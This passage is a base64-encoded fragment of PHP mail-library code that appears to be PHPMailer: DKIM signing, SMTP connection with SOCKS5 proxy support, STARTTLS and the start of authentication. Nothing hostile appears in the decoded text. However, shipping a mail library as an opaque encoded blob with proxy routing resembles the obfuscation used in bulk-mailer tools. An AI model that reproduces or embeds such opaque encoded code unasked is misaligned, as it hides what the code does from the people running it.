CAgICAgICAgICAgICAgIG9wZW5zc2xfcGtleV9mcmVlKCRwcml2S2V5KTsNCiAgICAgICAgICAgICAgICByZXR1cm4gYmFzZTY0X2VuY29kZSgkc2lnbmF0dXJlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRwaW5mbyA9IG9wZW5zc2xfcGtleV9nZXRfZGV0YWlscygkcHJpdktleSk7DQogICAgICAgICAgICAkaGFzaCAgPSBoYXNoKCdzaGEyNTYnLCAkc2lnbkhlYWRlcik7DQogICAgICAgICAgICAkdCAgICAgPSAnMzAzMTMwMGQwNjA5NjA4NjQ4MDE2NTAzMDQwMjAxMDUwMDA0MjAnIC4gJGhhc2g7DQogICAgICAgICAgICAkcHNsZW4gPSAkcGluZm9bJ2JpdHMnXSAvIDggLSAoc3RybGVuKCR0KSAvIDIgKyAzKTsNCiAgICAgICAgICAgICRlYiAgICA9IHBhY2soJ0gqJywgJzAwMDEnIC4gc3RyX3JlcGVhdCgnRkYnLCAkcHNsZW4pIC4gJzAwJyAuICR0KTsNCiAgICAgICAgICAgIGlmIChvcGVuc3NsX3ByaXZhdGVfZW5jcnlwdCgkZWIsICRzaWduYXR1cmUsICRwcml2S2V5LCBPUEVOU1NMX05PX1BBRERJTkcpKSB7DQogICAgICAgICAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOw0KICAgICAgICAgICAgICAgIHJldHVybiBiYXNlNjRfZW5jb2RlKCRzaWduYXR1cmUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIG9wZW5zc2xfcGtleV9mcmVlKCRwcml2S2V5KTsNCiAgICAgICAgcmV0dXJuICcnOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9IZWFkZXJDKCRzaWduSGVhZGVyKSB7DQogICAgICAgICRzaWduSGVhZGVyID0gcHJlZ19yZXBsYWNlKCcvXHJcblxzKy8nLCAnICcsICRzaWduSGVhZGVyKTsNCiAgICAgICAgJGxpbmVzICAgICAgPSBleHBsb2RlKCJcclxuIiwgJHNpZ25IZWFkZXIpOw0KICAgICAgICBmb3JlYWNoICgkbGluZXMgYXMgJGtleSA9PiAkbGluZSkgew0KICAgICAgICAgICAgbGlzdCgkaGVhZGluZywgJHZhbHVlKSA9IGV4cGxvZGUoJzonLCAkbGluZSwgMik7DQogICAgICAgICAgICAkaGVhZGluZyAgICAgPSBzdHJ0b2xvd2VyKCRoZWFkaW5nKTsNCiAgICAgICAgICAgICR2YWx1ZSAgICAgICA9IHByZWdfcmVwbGFjZSgnL1xzezIsfS8nLCAnICcsICR2YWx1ZSk7DQogICAgICAgICAgICAkbGluZXNbJGtleV0gPSAkaGVhZGluZyAuICc6JyAuIHRyaW0oJHZhbHVlKTsNCiAgICAgICAgfQ0KICAgICAgICAkc2lnbkhlYWRlciA9IGltcGxvZGUoIlxyXG4iLCAkbGluZXMpOw0KICAgICAgICByZXR1cm4gJHNpZ25IZWFkZXI7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX0JvZHlDKCRib2R5KSB7DQogICAgICAgIGlmICgkYm9keSA9PSAnJykgew0KICAgICAgICAgICAgcmV0dXJuICJcclxuIjsNCiAgICAgICAgfQ0KICAgICAgICAkYm9keSA9IHN0cl9yZXBsYWNlKCJcclxuIiwgIlxuIiwgJGJvZHkpOw0KICAgICAgICAkYm9keSA9IHN0cl9yZXBsYWNlKCJcbiIsICJcclxuIiwgJGJvZHkpOw0KICAgICAgICB3aGlsZSAoc3Vic3RyKCRib2R5LCBzdHJsZW4oJGJvZHkpIC0gNCwgNCkgPT0gIlxyXG5cclxuIikgew0KICAgICAgICAgICAgJGJvZHkgPSBzdWJzdHIoJGJvZHksIDAsIHN0cmxlbigkYm9keSkgLSAyKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJGJvZHk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX0FkZCgkaGVhZGVyc19saW5lLCAkc3ViamVjdCwgJGJvZHkpIHsNCiAgICAgICAgJERLSU1zaWduYXR1cmVUeXBlICAgID0gJ3JzYS1zaGEyNTYnOw0KICAgICAgICAkREtJTWNhbm9uaWNhbGl6YXRpb24gPSAncmVsYXhlZC9zaW1wbGUnOw0KICAgICAgICAkREtJTXF1ZXJ5ICAgICAgICAgICAgPSAnZG5zL3R4dCc7DQogICAgICAgICRES0lNdGltZSAgICAgICAgICAgICA9IHRpbWUoKTsNCiAgICAgICAgJHN1YmplY3RfaGVhZGVyICAgICAgID0gIlN1YmplY3Q6ICRzdWJqZWN0IjsNCiAgICAgICAgJGhlYWRlcnMgICAgICAgICAgICAgID0gZXhwbG9kZSgkdGhpcy0+TEUsICRoZWFkZXJzX2xpbmUpOw0KICAgICAgICAkZnJvbV9oZWFkZXIgICAgICAgICAgPSAnJzsNCiAgICAgICAgJHRvX2hlYWRlciAgICAgICAgICAgID0gJyc7DQogICAgICAgICRkYXRlX2hlYWRlciAgICAgICAgICA9ICcnOw0KICAgICAgICAkY3VycmVudCAgICAgICAgICAgICAgPSAnJzsNCiAgICAgICAgZm9yZWFjaCAoJGhlYWRlcnMgYXMgJGhlYWRlcikgew0KICAgICAgICAgICAgaWYgKHN0cnBvcygkaGVhZGVyLCAnRnJvbTonKSA9PT0gMCkgew0KICAgICAgICAgICAgICAgICRmcm9tX2hlYWRlciA9ICRoZWFkZXI7DQogICAgICAgICAgICAgICAgJGN1cnJlbnQgICAgID0gJ2Zyb21faGVhZGVyJzsNCiAgICAgICAgICAgIH0gZWxzZWlmIChzdHJwb3MoJGhlYWRlciwgJ1RvOicpID09PSAwKSB7DQogICAgICAgICAgICAgICAgJHRvX2hlYWRlciA9ICRoZWFkZXI7DQogICAgICAgICAgICAgICAgJGN1cnJlbnQgICA9ICd0b19oZWFkZXInOw0KICAgICAgICAgICAgfSBlbHNlaWYgKHN0cnBvcygkaGVhZGVyLCAnRGF0ZTonKSA9PT0gMCkgew0KICAgICAgICAgICAgICAgICRkYXRlX2hlYWRlciA9ICRoZWFkZXI7DQogICAgICAgICAgICAgICAgJGN1cnJlbnQgICAgID0gJ2RhdGVfaGVhZGVyJzsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkJGN1cnJlbnQpICYmIHN0cnBvcygkaGVhZGVyLCAnID0/JykgPT09IDApIHsNCiAgICAgICAgICAgICAgICAgICAgJCRjdXJyZW50IC49ICRoZWFkZXI7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJGN1cnJlbnQgPSAnJzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJGZyb20gICAgPSBzdHJfcmVwbGFjZSgnfCcsICc9N0MnLCAkdGhpcy0+REtJTV9RUCgkZnJvbV9oZWFkZXIpKTsNCiAgICAgICAgJHRvICAgICAgPSBzdHJfcmVwbGFjZSgnfCcsICc9N0MnLCAkdGhpcy0+REtJTV9RUCgkdG9faGVhZGVyKSk7DQogICAgICAgICRkYXRlICAgID0gc3RyX3JlcGxhY2UoJ3wnLCAnPTdDJywgJHRoaXMtPkRLSU1fUVAoJGRhdGVfaGVhZGVyKSk7DQogICAgICAgICRzdWJqZWN0ID0gc3RyX3JlcGxhY2UoJ3wnLCAnPTdDJywgJHRoaXMtPkRLSU1fUVAoJHN1YmplY3RfaGVhZGVyKSk7DQogICAgICAgICRib2R5ICAgID0gJHRoaXMtPkRLSU1fQm9keUMoJGJvZHkpOw0KICAgICAgICAkREtJTWxlbiA9IHN0cmxlbigkYm9keSk7DQogICAgICAgICRES0lNYjY0ID0gYmFzZTY0X2VuY29kZShwYWNrKCdIKicsIGhhc2goJ3NoYTI1NicsICRib2R5KSkpOw0KICAgICAgICBpZiAoJycgPT0gJHRoaXMtPkRLSU1faWRlbnRpdHkpIHsNCiAgICAgICAgICAgICRpZGVudCA9ICcnOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJGlkZW50ID0gJyBpPScgLiAkdGhpcy0+REtJTV9pZGVudGl0eSAuICc7JzsNCiAgICAgICAgfQ0KICAgICAgICAkZGtpbWhkcnMgPSAnREtJTS1TaWduYXR1cmU6IHY9MTsgYT0nIC4gJERLSU1zaWduYXR1cmVUeXBlIC4gJzsgcT0nIC4gJERLSU1xdWVyeSAuICc7IGw9JyAuICRES0lNbGVuIC4gJzsgcz0nIC4gJHRoaXMtPkRLSU1fc2VsZWN0b3IgLiAiO1xyXG4iIC4gIlx0dD0iIC4gJERLSU10aW1lIC4gJzsgYz0nIC4gJERLSU1jYW5vbmljYWxpemF0aW9uIC4gIjtcclxuIiAuICJcdGg9RnJvbTpUbzpEYXRlOlN1YmplY3Q7XHJcbiIgLiAiXHRkPSIgLiAkdGhpcy0+REtJTV9kb21haW4gLiAnOycgLiAkaWRlbnQgLiAiXHJcbiIgLiAiXHR6PSRmcm9tXHJcbiIgLiAiXHR8JHRvXHJcbiIgLiAiXHR8JGRhdGVcclxuIiAuICJcdHwkc3ViamVjdDtcclxuIiAuICJcdGJoPSIgLiAkREtJTWI2NCAuICI7XHJcbiIgLiAiXHRiPSI7DQogICAgICAgICR0b1NpZ24gICA9ICR0aGlzLT5ES0lNX0hlYWRlckMoJGZyb21faGVhZGVyIC4gIlxyXG4iIC4gJHRvX2hlYWRlciAuICJcclxuIiAuICRkYXRlX2hlYWRlciAuICJcclxuIiAuICRzdWJqZWN0X2hlYWRlciAuICJcclxuIiAuICRka2ltaGRycyk7DQogICAgICAgICRzaWduZWQgICA9ICR0aGlzLT5ES0lNX1NpZ24oJHRvU2lnbik7DQogICAgICAgIHJldHVybiAkZGtpbWhkcnMgLiAkc2lnbmVkIC4gIlxyXG4iOw0KICAgIH0NCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGhhc0xpbmVMb25nZXJUaGFuTWF4KCRzdHIpIHsNCiAgICAgICAgcmV0dXJuIChib29sZWFuKSBwcmVnX21hdGNoKCcvXigueycgLiAoc2VsZjo6TUFYX0xJTkVfTEVOR1RIICsgMikgLiAnLH0pL20nLCAkc3RyKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldFRvQWRkcmVzc2VzKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPnRvOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0Q2NBZGRyZXNzZXMoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+Y2M7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRCY2NBZGRyZXNzZXMoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+YmNjOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0UmVwbHlUb0FkZHJlc3NlcygpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5SZXBseVRvOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0QWxsUmVjaXBpZW50QWRkcmVzc2VzKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmFsbF9yZWNpcGllbnRzOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZG9DYWxsYmFjaygkaXNTZW50LCAkdG8sICRjYywgJGJjYywgJHN1YmplY3QsICRib2R5LCAkZnJvbSkgew0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5hY3Rpb25fZnVuY3Rpb24pICYmIGlzX2NhbGxhYmxlKCR0aGlzLT5hY3Rpb25fZnVuY3Rpb24pKSB7DQogICAgICAgICAgICAkcGFyYW1zID0gYXJyYXkoDQogICAgICAgICAgICAgICAgJGlzU2VudCwNCiAgICAgICAgICAgICAgICAkdG8sDQogICAgICAgICAgICAgICAgJGNjLA0KICAgICAgICAgICAgICAgICRiY2MsDQogICAgICAgICAgICAgICAgJHN1YmplY3QsDQogICAgICAgICAgICAgICAgJGJvZHksDQogICAgICAgICAgICAgICAgJGZyb20NCiAgICAgICAgICAgICk7DQogICAgICAgICAgICBjYWxsX3VzZXJfZnVuY19hcnJheSgkdGhpcy0+YWN0aW9uX2Z1bmN0aW9uLCAkcGFyYW1zKTsNCiAgICAgICAgfQ0KICAgIH0NCn0NCmNsYXNzIHBocG1haWxlckV4Y2VwdGlvbiBleHRlbmRzIEV4Y2VwdGlvbiB7DQogICAgcHVibGljIGZ1bmN0aW9uIGVycm9yTWVzc2FnZSgpIHsNCiAgICAgICAgJGVycm9yTXNnID0gJzxzdHJvbmc+JyAuICR0aGlzLT5nZXRNZXNzYWdlKCkgLiAiPC9zdHJvbmc+PGJyIC8+XG4iOw0KICAgICAgICByZXR1cm4gJGVycm9yTXNnOw0KICAgIH0NCn0NCmNsYXNzIFNNVFAgew0KICAgIGNvbnN0IENSTEYgPSAiXHJcbiI7DQogICAgY29uc3QgREVGQVVMVF9TTVRQX1BPUlQgPSAyNTsNCiAgICBjb25zdCBNQVhfTElORV9MRU5HVEggPSA5OTg7DQogICAgY29uc3QgREVCVUdfT0ZGID0gMDsNCiAgICBjb25zdCBERUJVR19DTElFTlQgPSAxOw0KICAgIGNvbnN0IERFQlVHX1NFUlZFUiA9IDI7DQogICAgY29uc3QgREVCVUdfQ09OTkVDVElPTiA9IDM7DQogICAgY29uc3QgREVCVUdfTE9XTEVWRUwgPSA0Ow0KICAgIHB1YmxpYyAkU01UUF9QT1JUID0gMjU7DQogICAgcHVibGljICRDUkxGID0gIlxyXG4iOw0KICAgIHB1YmxpYyAkZG9fZGVidWcgPSBzZWxmOjpERUJVR19PRkY7DQogICAgcHVibGljICREZWJ1Z291dHB1dCA9ICdlY2hvJzsNCiAgICBwdWJsaWMgJGRvX3ZlcnAgPSBmYWxzZTsNCiAgICBwdWJsaWMgJFRpbWVvdXQgPSAxMDsNCiAgICBwdWJsaWMgJFRpbWVsaW1pdCA9IDEwOw0KICAgIHB1YmxpYyAkVXNlU29ja3MgPSBmYWxzZTsNCiAgICBwdWJsaWMgJFNvY2tzSG9zdCA9IG51bGw7DQogICAgcHVibGljICRTb2Nrc1BvcnQgPSAwOw0KICAgIHByb3RlY3RlZCAkc210cF90cmFuc2FjdGlvbl9pZF9wYXR0ZXJucyA9IGFycmF5KCdleGltJyA9PiAnL1swLTldezN9IE9LIGlkPSguKikvJywgJ3NlbmRtYWlsJyA9PiAnL1swLTldezN9IDIuMC4wICguKikgTWVzc2FnZS8nLCAncG9zdGZpeCcgPT4gJy9bMC05XXszfSAyLjAuMCBPazogcXVldWVkIGFzICguKikvJyk7DQogICAgcHJvdGVjdGVkICRzbXRwX2Nvbm47DQogICAgcHJvdGVjdGVkICRlcnJvciA9IGFycmF5KCdlcnJvcicgPT4gJycsICdkZXRhaWwnID0+ICcnLCAnc210cF9jb2RlJyA9PiAnJywgJ3NtdHBfY29kZV9leCcgPT4gJycpOw0KICAgIHByb3RlY3RlZCAkaGVsb19ycGx5ID0gbnVsbDsNCiAgICBwcm90ZWN0ZWQgJHNlcnZlcl9jYXBzID0gbnVsbDsNCiAgICBwcm90ZWN0ZWQgJGxhc3RfcmVwbHkgPSAnJzsNCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZWRlYnVnKCRzdHIsICRsZXZlbCA9IDApIHsNCiAgICAgICAgaWYgKCRsZXZlbCA+ICR0aGlzLT5kb19kZWJ1Zykgew0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQogICAgICAgIGlmICghaW5fYXJyYXkoJHRoaXMtPkRlYnVnb3V0cHV0LCBhcnJheSgNCiAgICAgICAgICAgICdlcnJvcl9sb2cnLA0KICAgICAgICAgICAgJ2h0bWwnLA0KICAgICAgICAgICAgJ2VjaG8nDQogICAgICAgICkpIGFuZCBpc19jYWxsYWJsZSgkdGhpcy0+RGVidWdvdXRwdXQpKSB7DQogICAgICAgICAgICBjYWxsX3VzZXJfZnVuYygkdGhpcy0+RGVidWdvdXRwdXQsICRzdHIsICRsZXZlbCk7DQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICAgICAgc3dpdGNoICgkdGhpcy0+RGVidWdvdXRwdXQpIHsNCiAgICAgICAgICAgIGNhc2UgJ2Vycm9yX2xvZyc6DQogICAgICAgICAgICAgICAgZXJyb3JfbG9nKCRzdHIpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnaHRtbCc6DQogICAgICAgICAgICAgICAgZWNobyBodG1sZW50aXRpZXMocHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJHN0ciksIEVOVF9RVU9URVMsICdVVEYtOCcpIC4gIjxicj5cbiI7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdlY2hvJzoNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgJHN0ciA9IHByZWdfcmVwbGFjZSgnLyhcclxufFxyfFxuKS9tcycsICJcbiIsICRzdHIpOw0KICAgICAgICAgICAgICAgIGVjaG8gZ21kYXRlKCdZLW0tZCBIOmk6cycpIC4gIlx0IiAuIHN0cl9yZXBsYWNlKCJcbiIsICJcbiAgICAgICAgICAgICAgICAgICBcdCAgICAgICAgICAgICAgICAgICIsIHRyaW0oJHN0cikpIC4gIlxuIjsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY29ubmVjdCgkaG9zdCwgJHBvcnQgPSBudWxsLCAkdGltZW91dCA9IDEwLCAkb3B0aW9ucyA9IGFycmF5KCkpIHsNCiAgICAgICAgc3RhdGljICRzdHJlYW1vazsNCiAgICAgICAgaWYgKGlzX251bGwoJHN0cmVhbW9rKSkgew0KICAgICAgICAgICAgJHN0cmVhbW9rID0gZnVuY3Rpb25fZXhpc3RzKCdzdHJlYW1fc29ja2V0X2NsaWVudCcpOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5zZXRFcnJvcignJyk7DQogICAgICAgIGlmICgkdGhpcy0+Y29ubmVjdGVkKCkpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcignQWxyZWFkeSBjb25uZWN0ZWQgdG8gYSBzZXJ2ZXInKTsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoZW1wdHkoJHBvcnQpKSB7DQogICAgICAgICAgICAkcG9ydCA9IHNlbGY6OkRFRkFVTFRfU01UUF9QT1JUOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+VXNlU29ja3MpIHsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoIkNvbm5lY3Rpb246IG9wZW5pbmcgdG8gJGhvc3Q6JHBvcnQsIHNvY2tzPXskdGhpcy0+U29ja3NIb3N0fTp7JHRoaXMtPlNvY2tzUG9ydH0sIHRpbWVvdXQ9JHRpbWVvdXQsIG9wdGlvbnM9IiAuIHZhcl9leHBvcnQoJG9wdGlvbnMsIHRydWUpLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsNCiAgICAgICAgICAgICRTb2Nrc1NvY2tldCA9IEBmc29ja29wZW4oJHRoaXMtPlNvY2tzSG9zdCwgJHRoaXMtPlNvY2tzUG9ydCwgJGVycm5vLCAkZXJyYnVmLCAkdGltZW91dCk7DQogICAgICAgICAgICBpZiAoISRTb2Nrc1NvY2tldCkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoIkNvbm5lY3Rpb24gdG8gU09DS1Mgc2VydmVyIGNvdWxkIG5vdCBiZSBlc3RhYmxpc2hlZCBvbiAiIC4gJHRoaXMtPlNvY2tzSG9zdCAuICI6IiAuICR0aGlzLT5Tb2Nrc1BvcnQgLiAiIChDb25uZWN0aW9uIHJlZnVzZWQpIiwgc2VsZjo6REVCVUdfQ09OTkVDVElPTik7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZndyaXRlKCRTb2Nrc1NvY2tldCwgcGFjaygiQzMiLCAweDA1LCAweDAxLCAweDAwKSk7DQogICAgICAgICAgICAkU29ja3NTdGF0dXMgPSBmcmVhZCgkU29ja3NTb2NrZXQsIDgxOTIpOw0KICAgICAgICAgICAgJHJlc3BvbmNlICAgID0gdW5wYWNrKCJDdmVyc2lvbi9DbWV0aG9kIiwgJFNvY2tzU3RhdHVzKTsNCiAgICAgICAgICAgIGlmICgkcmVzcG9uY2VbInZlcnNpb24iXSAhPSAweDA1IGFuZCAkcmVzcG9uY2VbIm1ldGhvZCJdICE9IDB4MDApIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCJTT0NLUyBTZXJ2ZXIgZG9lcyBub3Qgc3VwcG9ydCB0aGlzIHZlcnNpb24gYW5kL29yIGF1dGhlbnRpY2F0aW9uIG1ldGhvZCBvZiBTT0NLUy4iLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoaXAybG9uZygkaG9zdCkgPT0gLTEpIHsNCiAgICAgICAgICAgICAgICBmd3JpdGUoJFNvY2tzU29ja2V0LCBwYWNrKCJDNSIsIDB4MDUsIDB4MDEsIDB4MDAsIDB4MDMsIHN0cmxlbigkaG9zdCkpIC4gJGhvc3QgLiBwYWNrKCJuIiwgJHBvcnQpKTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgZndyaXRlKCRTb2Nrc1NvY2tldCwgcGFjaygiQzRObiIsIDB4MDUsIDB4MDEsIDB4MDAsIDB4MDEsIGlwMmxvbmcoZ2V0aG9zdGJ5bmFtZSgkaG9zdCkpLCAkcG9ydCkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJFNvY2tzU3RhdHVzID0gZnJlYWQoJFNvY2tzU29ja2V0LCA4MTkyKTsNCiAgICAgICAgICAgICRyZXNwb25jZSAgICA9IHVucGFjaygiQ3ZlcnNpb24vQ3Jlc3VsdC9DcmVnL0N0eXBlL0xpcC9TcG9ydCIsICRTb2Nrc1N0YXR1cyk7DQogICAgICAgICAgICBpZiAoJHJlc3BvbmNlWyJ2ZXJzaW9uIl0gPT0gMHgwNSBhbmQgJHJlc3BvbmNlWyJyZXN1bHQiXSA9PSAweDAwKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPnNtdHBfY29ubiA9ICRTb2Nrc1NvY2tldDsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygiVGhlIFNPQ0tTIHNlcnZlciBmYWlsZWQgdG8gY29ubmVjdCB0byB0aGUgc3BlY2lmaWNlZCBob3N0IGFuZCBwb3J0LiAoICIgLiAkaG9zdCAuICI6IiAuICRwb3J0IC4gIiApIiwgc2VsZjo6REVCVUdfQ09OTkVDVElPTik7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygiQ29ubmVjdGlvbjogb3BlbmluZyB0byAkaG9zdDokcG9ydCwgdGltZW91dD0kdGltZW91dCwgb3B0aW9ucz0iIC4gdmFyX2V4cG9ydCgkb3B0aW9ucywgdHJ1ZSksIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04pOw0KICAgICAgICAgICAgJGVycm5vICA9IDA7DQogICAgICAgICAgICAkZXJyc3RyID0gJyc7DQogICAgICAgICAgICBpZiAoJHN0cmVhbW9rKSB7DQogICAgICAgICAgICAgICAgJHNvY2tldF9jb250ZXh0ICA9IHN0cmVhbV9jb250ZXh0X2NyZWF0ZSgkb3B0aW9ucyk7DQogICAgICAgICAgICAgICAgJHRoaXMtPnNtdHBfY29ubiA9IEBzdHJlYW1fc29ja2V0X2NsaWVudCgkaG9zdCAuICI6IiAuICRwb3J0LCAkZXJybm8sICRlcnJzdHIsICR0aW1lb3V0LCBTVFJFQU1fQ0xJRU5UX0NPTk5FQ1QsICRzb2NrZXRfY29udGV4dCk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoIkNvbm5lY3Rpb246IHN0cmVhbV9zb2NrZXRfY2xpZW50IG5vdCBhdmFpbGFibGUsIGZhbGxpbmcgYmFjayB0byBmc29ja29wZW4iLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c210cF9jb25uID0gZnNvY2tvcGVuKCRob3N0LCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAkdGltZW91dCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFpc19yZXNvdXJjZSgkdGhpcy0+c210cF9jb25uKSkgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCdGYWlsZWQgdG8gY29ubmVjdCB0byBzZXJ2ZXInLCAkZXJybm8sICRlcnJzdHIpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygnU01UUCBFUlJPUjogJyAuICR0aGlzLT5lcnJvclsnZXJyb3InXSAuICI6ICRlcnJzdHIgKCRlcnJubykiLCBzZWxmOjpERUJVR19DTElFTlQpOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5lZGVidWcoJ0Nvbm5lY3Rpb246IG9wZW5lZCcsIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04pOw0KICAgICAgICBpZiAoc3Vic3RyKFBIUF9PUywgMCwgMykgIT0gJ1dJTicpIHsNCiAgICAgICAgICAgICRtYXggPSBpbmlfZ2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnKTsNCiAgICAgICAgICAgIGlmICgkbWF4ICE9IDAgJiYgJHRpbWVvdXQgPiAkbWF4KSB7DQogICAgICAgICAgICAgICAgQHNldF90aW1lX2xpbWl0KCR0aW1lb3V0KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHN0cmVhbV9zZXRfdGltZW91dCgkdGhpcy0+c210cF9jb25uLCAkdGltZW91dCwgMCk7DQogICAgICAgIH0NCiAgICAgICAgJGFubm91bmNlID0gJHRoaXMtPmdldF9saW5lcygpOw0KICAgICAgICAkdGhpcy0+ZWRlYnVnKCdTRVJWRVIgLT4gQ0xJRU5UOiAnIC4gJGFubm91bmNlLCBzZWxmOjpERUJVR19TRVJWRVIpOw0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHN0YXJ0VExTKCkgew0KICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnU1RBUlRUTFMnLCAnU1RBUlRUTFMnLCAyMjApKSB7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgJGNyeXB0b19tZXRob2QgPSBTVFJFQU1fQ1JZUFRPX01FVEhPRF9UTFNfQ0xJRU5UOw0KICAgICAgICBpZiAoZGVmaW5lZCgnU1RSRUFNX0NSWVBUT19NRVRIT0RfVExTdjFfMl9DTElFTlQnKSkgew0KICAgICAgICAgICAgJGNyeXB0b19tZXRob2QgfD0gU1RSRUFNX0NSWVBUT19NRVRIT0RfVExTdjFfMl9DTElFTlQ7DQogICAgICAgICAgICAkY3J5cHRvX21ldGhvZCB8PSBTVFJFQU1fQ1JZUFRPX01FVEhPRF9UTFN2MV8xX0NMSUVOVDsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIXN0cmVhbV9zb2NrZXRfZW5hYmxlX2NyeXB0bygkdGhpcy0+c210cF9jb25uLCB0cnVlLCAkY3J5cHRvX21ldGhvZCkpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGF1dGhlbnRpY2F0ZSgkdXNlcm5hbWUsICRwYXNzd29yZCwgJGF1dGh0eXBlID0gbnVsbCwgJHJlYWxtID0gJycsICR3b3Jrc3RhdGlvbiA9ICcnLCAkT0F1dGggPSBudWxsKSB7DQogICAgICAgIGlmICghJHRoaXMtPnNlcnZlcl9jYXBzKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ0F1dGhlbnRpY2F0aW9uIGlzIG5vdCBhbGxvd2VkIGJlZm9yZSBIRUxPL0VITE8nKTsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygnRUhMTycsICR0aGlzLT5zZXJ2ZXJfY2FwcykpIHsNCiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygnQVVUSCcsICR0aGlzLT5zZXJ2ZXJfY2FwcykpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ0F1dGhlbnRpY2F0aW9uIGlzIG5vdCBhbGxvd2VkIGF0IHRoaXMgc3RhZ2UnKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBzZWxmOjplZGVidWcoJ0F1dGggbWV0aG9kIHJlcXVlc3RlZDogJyAuICgkYXV0aHR5cGUgPyAkYXV0aHR5cGUgOiAnVU5LTk9XTicpLCBzZWxmOjpER